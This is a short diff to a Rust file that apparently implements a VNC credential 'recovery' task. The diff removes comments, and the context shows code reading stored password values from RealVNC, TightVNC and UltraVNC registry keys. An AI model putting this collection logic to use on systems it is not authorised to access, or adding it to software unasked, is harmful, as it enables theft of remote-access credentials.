@@ -41,7 +41,6 @@ impl RecoveryTask for VncTask {
     async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
         let mut credentials = Vec::new();
 
-        // RealVNC Viewer (HKCU)
         collect_registry_binary(
             HKEY_CURRENT_USER,
             r"Software\RealVNC\vncviewer",
@@ -50,7 +49,6 @@ impl RecoveryTask for VncTask {
             &mut credentials,
         );
 
-        // RealVNC Server (HKLM)
         collect_registry_binary(
             HKEY_LOCAL_MACHINE,
             r"Software\RealVNC\vncserver",
@@ -59,7 +57,6 @@ impl RecoveryTask for VncTask {
             &mut credentials,
         );
 
-        // TightVNC Server (HKLM)
         collect_registry_binary(
             HKEY_LOCAL_MACHINE,
             r"Software\TightVNC\Server",
@@ -76,7 +73,6 @@ impl RecoveryTask for VncTask {
             &mut credentials,
         );
 
-        // UltraVNC Server (HKLM)
         collect_registry_binary(
             HKEY_LOCAL_MACHINE,
             r"Software\ORL\WinVNC3",
